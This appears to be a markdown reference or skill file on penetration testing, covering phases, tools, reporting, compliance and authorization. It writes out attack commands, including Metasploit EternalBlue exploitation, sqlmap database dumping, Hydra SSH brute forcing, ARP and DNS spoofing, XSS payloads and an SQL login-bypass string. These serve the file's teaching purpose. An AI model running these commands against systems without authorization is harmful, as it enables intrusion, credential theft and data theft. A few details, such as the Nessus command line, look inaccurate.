---
name: Penetration Testing
description: Simulated cyberattacks on systems to identify vulnerabilities before malicious attackers do, including ethical hacking, vulnerability assessment, and security testing with explicit permission.
---

# Penetration Testing

> **Current Level:** Advanced  
> **Domain:** Security / Testing

---

## Overview

Penetration testing (pen testing) is a simulated cyberattack on your systems to identify vulnerabilities before malicious attackers do. It's ethical hacking with explicit permission. Effective penetration testing includes planning, reconnaissance, exploitation, reporting, and remediation verification.

## What is Penetration Testing

### Pen Testing Goals

| Goal | Description |
|-------|-------------|
| **Identify Vulnerabilities** | Find security weaknesses |
| **Assess Risk** | Determine potential impact |
| **Validate Controls** | Test security measures |
| **Prioritize Fixes** | Guide remediation efforts |
| **Compliance** | Meet regulatory requirements |

### Why Pen Testing Matters

| Benefit | Impact |
|---------|---------|
| **Find vulnerabilities first** | Before attackers do |
| **Test real-world scenarios** | Simulate actual attacks |
| **Validate security investments** | Confirm controls work |
| **Meet compliance** | PCI DSS, SOC2, etc. |
| **Reduce breach risk** | Proactive security |

## Types of Pen Tests

### Black Box Testing

**Definition**: No prior knowledge of systems

| Pros | Cons |
|-------|-------|
| Realistic attack simulation | Time-consuming |
| Tests discovery | May miss deep vulnerabilities |
| No bias | Less comprehensive |

**Use Case**: External penetration test

### White Box Testing

**Definition**: Full knowledge of systems (code, architecture)

| Pros | Cons |
|-------|-------|
| Comprehensive | Not realistic |
| Fast | May miss discovery issues |
| Finds deep issues | Requires access |

**Use Case**: Internal code review

### Gray Box Testing

**Definition**: Partial knowledge (some access, some info)

| Pros | Cons |
|-------|-------|
| Balanced approach | Requires coordination |
| More realistic than white box | Less comprehensive |

**Use Case**: Most common pen test type

## Pen Testing Phases

### The Pen Testing Lifecycle

```
┌─────────────┐    ┌─────────────┐    ┌─────────────┐    ┌─────────────┐    ┌─────────────┐
│Reconnaissance│───▶│  Scanning   │───▶│Exploitation│───▶│Maintaining  │───▶│  Reporting   │
│             │    │             │    │             │    │  Access     │    │             │
│ Gather info  │    │ Identify    │    │ Exploit     │    │ Keep access │    │ Document    │
│ on target    │    │ vulnerable  │    │ vulns       │    │ for further  │    │ findings    │
│             │    │ services    │    │             │    │ exploration │    │             │
└─────────────┘    └─────────────┘    └─────────────┘    └─────────────┘    └─────────────┘
```

## Reconnaissance

### Passive Reconnaissance

Gather information without direct interaction.

| Technique | Tools | What It Finds |
|-------------|--------|----------------|
| **Google dorking** | Google | Exposed files, admin panels |
| **WHOIS** | whois, DomainTools | Domain registration info |
| **DNS enumeration** | nslookup, dig | Subdomains, DNS records |
| **Shodan** | Shodan | Exposed services |
| **Social media** | OSINT tools | Employee information |

### Active Reconnaissance

Interact with target to gather information.

| Technique | Tools | What It Finds |
|-------------|--------|----------------|
| **Port scanning** | Nmap | Open ports, services |
| **Service enumeration** | Nmap, Nikto | Service versions |
| **Web crawling** | Burp, ZAP | Website structure |
| **Directory brute force** | DirBuster, Gobuster | Hidden directories |

### Reconnaissance Example

```bash
# Port scanning
nmap -sV -sC -p- 10.0.0.1

# Subdomain enumeration
subfinder -d example.com

# Web crawling
gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt

# Shodan search
shodan search "org:Example Corp"
```

## Scanning

### Port Scanning

**Nmap Commands**:

```bash
# Basic scan
nmap target.com

# Service version detection
nmap -sV target.com

# OS detection
nmap -O target.com

# Aggressive scan
nmap -A target.com

# Scan specific ports
nmap -p 80,443,22 target.com

# Scan all ports
nmap -p- target.com

# Output formats
nmap -oN output.txt target.com
nmap -oX output.xml target.com
```

### Vulnerability Scanning

| Tool | Type | What It Finds |
|-------|-------|----------------|
| **Nessus** | Commercial | Known vulnerabilities |
| **OpenVAS** | Open-source | Known vulnerabilities |
| **Nikto** | Web scanner | Web server vulnerabilities |
| **SQLMap** | SQL injection | SQL injection vulnerabilities |

### Scanning Example

```bash
# Vulnerability scan with Nessus
nessus -i targets.txt -o results.xml

# Web vulnerability scan with Nikto
nikto -h https://example.com

# SQL injection scan with SQLMap
sqlmap -u "https://example.com/page?id=1"
```

## Exploitation

### Exploit Tools

| Tool | Type | Use Case |
|-------|-------|----------|
| **Metasploit** | Exploitation framework | Known exploits |
| **Burp Suite** | Web application testing | Manual exploitation |
| **SQLMap** | SQL injection | Database exploitation |
| **Hydra** | Password cracking | Brute force attacks |

### Exploitation Example

```bash
# Use Metasploit
msfconsole
search type:exploit platform:windows
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 10.0.0.1
exploit

# SQL injection with SQLMap
sqlmap -u "https://example.com/page?id=1" --dbs

# Password cracking with Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1
```

## Common Targets

### Web Applications

| Vulnerability | Tool |
|---------------|-------|
| **SQL injection** | SQLMap, Burp |
| **XSS** | Burp, XSSer |
| **CSRF** | Burp, CSRFTester |
| **Authentication bypass** | Burp, OWASP ZAP |
| **File upload** | Burp, OWASP ZAP |

### Network Infrastructure

| Vulnerability | Tool |
|---------------|-------|
| **Unpatched services** | Nmap, Nessus |
| **Weak credentials** | Hydra, Medusa |
| **Misconfigured firewall** | Nmap, tcpdump |
| **Default credentials** | Nmap, Metasploit |

### APIs

| Vulnerability | Tool |
|---------------|-------|
| **Broken authentication** | Burp, Postman |
| **Excessive data exposure** | Burp, OWASP ZAP |
| **Lack of rate limiting** | JMeter, OWASP ZAP |
| **Injection flaws** | SQLMap, Burp |

### Mobile Apps

| Vulnerability | Tool |
|---------------|-------|
| **Insecure storage** | MobSF, Frida |
| **Weak encryption** | MobSF, Frida |
| **Insecure communication** | Burp, Wireshark |
| **Code tampering** | Frida, Xposed |

## Tools

### Kali Linux

Penetration testing distribution with pre-installed tools.

**Categories**:
- Information gathering
- Vulnerability assessment
- Web application analysis
- Exploitation tools
- Password attacks
- Sniffing/spoofing

### Nmap

**Port scanning**:

```bash
# Scan all ports
nmap -p- target.com

# Scan with scripts
nmap --script vuln target.com

# Scan UDP
nmap -sU target.com
```

### Metasploit

**Exploitation framework**:

```bash
# Start console
msfconsole

# Search exploits
search type:exploit

# Use exploit
use exploit/windows/smb/ms17_010_eternalblue

# Set options
set RHOST 10.0.0.1
set LHOST 10.0.0.2

# Exploit
exploit

# Sessions
sessions -l
```

### Burp Suite

**Web application testing**:

1. **Proxy**: Intercept and modify requests
2. **Repeater**: Modify and resend requests
3. **Intruder**: Automate attacks
4. **Scanner**: Find vulnerabilities
5. **Repeater**: Test payloads

### Wireshark

**Network analysis**:

```bash
# Capture traffic
wireshark -i eth0

# Filter by IP
ip.addr == 10.0.0.1

# Filter by protocol
http or dns

# Filter by port
tcp.port == 80
```

### John the Ripper

**Password cracking**:

```bash
# Crack password hashes
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Show cracked passwords
john --show hashes.txt
```

## Web App Testing

### SQL Injection

**Testing**:

```bash
# Test for SQL injection
sqlmap -u "https://example.com/page?id=1"

# Enumerate databases
sqlmap -u "https://example.com/page?id=1" --dbs

# Dump tables
sqlmap -u "https://example.com/page?id=1" -D database --tables

# Dump columns
sqlmap -u "https://example.com/page?id=1" -D database -T table --columns
```

### XSS Testing

**Testing**:

```bash
# Test for XSS
xsser -u "https://example.com/page?param=value"

# Manual testing
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

### CSRF Testing

**Testing**:

```bash
# Generate CSRF PoC with Burp
# Use CSRFTester
# Check for anti-CSRF tokens
```

## Network Testing

### Firewall Bypass

**Techniques**:
- Port knocking
- Firewall evasion
- Fragmentation

### Man-in-the-Middle

**Tools**: Ettercap, Bettercap

```bash
# ARP spoofing with Ettercap
ettercap -T arp -i eth0 -M /gateway_ip/ /target_ip/
```

### DNS Poisoning

**Tools**: DNSChef, dnsspoof

```bash
# DNS spoofing with dnsspoof
dnsspoof -i eth0 -f /etc/hosts
```

## Reporting

### Report Structure

1. **Executive Summary**
   - High-level findings
   - Risk assessment
   - Recommendations

2. **Methodology**
   - Scope
   - Tools used
   - Testing approach

3. **Findings**
   - Vulnerability details
   - Evidence
   - Impact assessment

4. **Recommendations**
   - Prioritized fixes
   - Remediation steps

5. **Appendices**
   - Detailed technical info
   - Screenshots
   - Logs

### Risk Rating

| Rating | Description | Example |
|--------|-------------|---------|
| **Critical** | Immediate action required | Remote code execution |
| **High** | Important to fix | SQL injection |
| **Medium** | Should fix | XSS |
| **Low** | Nice to fix | Information disclosure |

### Finding Template

```
# Finding: SQL Injection in Login Form

**Severity**: Critical

**Description**:
The login form is vulnerable to SQL injection, allowing attackers to bypass authentication and access the database.

**Evidence**:
Payload: ' OR '1'='1
Response: Login successful

**Impact**:
- Unauthorized database access
- Data exfiltration
- Potential complete system compromise

**Recommendation**:
Use parameterized queries to prevent SQL injection.

**Remediation**:
```javascript
// Vulnerable code
const query = `SELECT * FROM users WHERE username = '${username}'`;

// Fixed code
const query = 'SELECT * FROM users WHERE username = $1';
await db.query(query, [username]);
```
```

## Pen Test Frequency

| Organization Type | Frequency |
|------------------|-----------|
| **High security** | Quarterly |
| **Medium security** | Semi-annually |
| **Low security** | Annually |
| **After major changes** | Immediately |

### Compliance Requirements

| Regulation | Requirement |
|------------|-------------|
| **PCI DSS** | Annual pen test + quarterly ASV scan |
| **SOC2** | Annual pen test |
| **HIPAA** | Risk assessment (pen test recommended) |
| **ISO 27001** | Regular security testing |

## In-House vs Outsourced

| Aspect | In-House | Outsourced |
|--------|------------|-------------|
| **Cost** | Lower | Higher |
| **Expertise** | Limited | Broad |
| **Perspective** | Biased | Unbiased |
| **Tools** | Limited | Comprehensive |
| **Certification** | May not have | Certified |

### When to Use Each

| Situation | Approach |
|-----------|-----------|
| **Regular testing** | In-house |
| **Compliance** | Outsourced (certified) |
| **Specialized testing** | Outsourced |
| **Continuous testing** | In-house + automated |

## Bug Bounty Programs

### Crowdsourced Security Testing

**Benefits**:
- Continuous testing
- Global talent pool
- Pay for valid vulnerabilities
- White-hat engagement

### Platforms

| Platform | Description |
|-----------|-------------|
| **HackerOne** | Largest bug bounty platform |
| **Bugcrowd** | Enterprise-focused |
| **Intigriti** | High-quality researchers |
| **YesWeHack** | European platform |

### Bounty Structure

| Severity | Typical Bounty |
|----------|----------------|
| **Critical** | $10,000+ |
| **High** | $1,000 - $10,000 |
| **Medium** | $100 - $1,000 |
| **Low** | $50 - $100 |

### Program Setup

**Components**:
- Scope (what's in/out)
- Rules of engagement
- Bounty amounts
- Disclosure policy
- Safe harbor

## Legal and Ethical

### Always Get Permission

**Required**:
- Written authorization
- Defined scope
- Rules of engagement
- Non-disclosure agreement

### Scope Definition

| In Scope | Out of Scope |
|-----------|--------------|
| `example.com` | `example.org` |
| `api.example.com` | Third-party services |
| Mobile app | Physical security |
| Employee accounts | Social engineering |

### Rules of Engagement

1. **No disruption** | Don't impact production |
2. **No data exfiltration** | Don't steal data |
3. **Report findings** | Report all vulnerabilities |
4. **Respect privacy** | Don't access personal data |
5. **Stop if asked** | Stop immediately if requested |

### Non-Disclosure Agreement

**Key Points**:
- Confidentiality of findings
- No disclosure without permission
- Return all data after test
- No use of findings for other purposes

## Real Pen Test Scenarios

### Scenario 1: Web App Security Assessment

**Target**: E-commerce website

**Approach**:
1. Reconnaissance: Gather info about site
2. Scanning: Identify technologies, vulnerabilities
3. Testing: Test for OWASP Top 10
4. Exploitation: Attempt to exploit vulnerabilities
5. Reporting: Document findings and recommendations

**Findings**:
- SQL injection in search
- XSS in product reviews
- CSRF in checkout
- Broken access control in user profiles

### Scenario 2: Network Infrastructure Test

**Target**: Corporate network

**Approach**:
1. Reconnaissance: Identify network range
2. Scanning: Find open ports, services
3. Exploitation: Attempt to exploit services
4. Lateral movement: Move within network
5. Reporting: Document findings

**Findings**:
- Unpatched Windows server
- Default credentials on router
- Misconfigured firewall
- Weak SMB configuration

### Scenario 3: Cloud Security Review

**Target**: AWS infrastructure

**Approach**:
1. Reconnaissance: Identify AWS resources
2. Scanning: Check for misconfigurations
3. Testing: Test IAM permissions, S3 buckets
4. Exploitation: Attempt to access resources
5. Reporting: Document findings

**Findings**:
- Publicly accessible S3 bucket
- Overly permissive IAM role
- Unencrypted EBS volumes
- Security groups allow 0.0.0.0/0

## Summary Checklist

### Before Pen Test

- [ ] Written authorization obtained
- [ ] Scope defined
- [ ] Rules of engagement agreed
- [ ] NDA signed
- [ ] Tools prepared

### During Pen Test

- [ ] Stay within scope
- [ ] Document all findings
- [ ] Preserve evidence
- [ ] Report issues immediately
- [ ] Stop if asked
```

---

## Quick Start

### Penetration Testing Tools

```bash
# OWASP ZAP
docker run -t owasp/zap2docker-stable zap-baseline.py -t http://target-app.com

# Nmap scan
nmap -sV -sC target.com

# Burp Suite
# Use Burp Suite for manual testing
```

### Vulnerability Reporting

```markdown
# Vulnerability Report

## Summary
[Brief description]

## Severity
[Critical/High/Medium/Low]

## Description
[Detailed description]

## Impact
[Potential impact]

## Steps to Reproduce
1. Step 1
2. Step 2

## Remediation
[How to fix]

## References
[CVEs, OWASP, etc.]
```

---

## Production Checklist

- [ ] **Scope Definition**: Define testing scope
- [ ] **Authorization**: Written authorization obtained
- [ ] **Tools**: Penetration testing tools prepared
- [ ] **Team**: Penetration testing team assembled
- [ ] **Documentation**: Document all findings
- [ ] **Reporting**: Comprehensive vulnerability report
- [ ] **Remediation**: Remediation recommendations
- [ ] **Verification**: Verify fixes after remediation
- [ ] **Compliance**: Meet compliance requirements
- [ ] **Regular Testing**: Schedule regular pen tests
- [ ] **Documentation**: Document pen test process
- [ ] **Training**: Team security training

---

## Anti-patterns

### ❌ Don't: No Authorization

```markdown
# ❌ Bad - No authorization
"Let me test this system"
# Unauthorized access!
```

```markdown
# ✅ Good - Written authorization
Authorization letter signed by:
- CTO
- Security team
- Legal team
Scope clearly defined
```

### ❌ Don't: Out of Scope

```markdown
# ❌ Bad - Out of scope
Scope: Web application
Action: Tested production database
# Beyond scope!
```

```markdown
# ✅ Good - Stay in scope
Scope: Web application
Action: Tested only web application
# Within scope
```

---

## Integration Points

- **Vulnerability Management** (`24-security-practices/vulnerability-management/`) - Vulnerability handling
- **Security Audit** (`24-security-practices/security-audit/`) - Security reviews
- **OWASP Top 10** (`24-security-practices/owasp-top-10/`) - Common vulnerabilities

---

## Further Reading

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PTES Methodology](http://www.pentest-standard.org/)

### After Pen Test

- [ ] Complete report written
- [ ] Findings presented
- [ ] Recommendations provided
- [ ] Evidence returned
- [ ] Follow-up scheduled
